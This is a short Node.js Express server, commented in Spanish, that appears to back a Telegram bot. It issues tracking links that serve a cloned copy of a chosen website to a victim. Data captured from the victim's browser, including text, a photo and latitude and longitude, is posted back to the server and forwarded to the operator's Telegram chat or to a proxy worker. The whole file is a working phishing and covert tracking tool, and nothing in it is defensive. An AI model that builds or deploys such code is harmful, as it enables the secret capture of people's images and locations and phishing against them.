const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== CONFIGURACIÓN ==========
const BASE_URL = process.env.BASE_URL || 'https://societyy-9z4e.onrender.com';
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const WORKER_URL = process.env.WORKER_URL || ''; // Opcional, para usar proxy

// ========== ALMACENAMIENTO ==========
const tokens = {};

function generateToken() {
    return crypto.randomBytes(6).toString('hex');
}

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ========== RUTA PARA GENERAR ENLACE (DESDE EL BOT) ==========
app.post('/generate', (req, res) => {
    const { url, chatId } = req.body;
    if (!url || !chatId) {
        return res.status(400).json({ error: 'Faltan datos' });
    }
    const token = generateToken();
    tokens[token] = { url, chatId, timestamp: Date.now() };
    const trackLink = `${BASE_URL}/track/${token}`;
    res.json({ link: trackLink, token });
});

// ========== RUTA DE TRACKING ==========
app.get('/track/:token', (req, res) => {
    const token = req.params.token;
    const data = tokens[token];
    if (!data) {
        return res.status(404).send('Enlace no válido');
    }

    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
    html = html.replace('{{CLONED_URL}}', data.url);
    html = html.replace('{{TRACKING_ID}}', token);
    html = html.replace('{{SERVER_URL}}', WORKER_URL || BASE_URL);

    res.send(html);
});

// ========== RUTA PARA RECIBIR DATOS CAPTURADOS ==========
app.post('/track/:token', async (req, res) => {
    const token = req.params.token;
    const data = tokens[token];
    if (!data) {
        return res.status(404).send('Token no válido');
    }

    // Si usas Worker, no proceses aquí, el Worker se encarga
    if (WORKER_URL) {
        // Reenviar al Worker
        try {
            const formData = new FormData();
            for (const key in req.body) {
                formData.append(key, req.body[key]);
            }
            await fetch(WORKER_URL, { method: 'POST', body: formData });
            return res.send('OK');
        } catch(e) {
            return res.status(500).send('Error al reenviar');
        }
    }

    // Si no usas Worker, procesa aquí
    const { text, photo, latitude, longitude } = req.body;

    if (BOT_TOKEN && ADMIN_ID) {
        try {
            // Enviar mensaje
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
            });
            // Enviar foto si existe
            if (photo) {
                const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append('chat_id', ADMIN_ID);
                formData.append('photo', photo);
                await fetch(photoUrl, { method: 'POST', body: formData });
            }
        } catch(e) {
            console.error('Error al enviar a Telegram:', e);
        }
    }

    res.send('OK');
});

// ========== INICIAR SERVIDOR ==========
app.listen(PORT, () => {
    console.log(`✅ Servidor en puerto ${PORT}`);
});
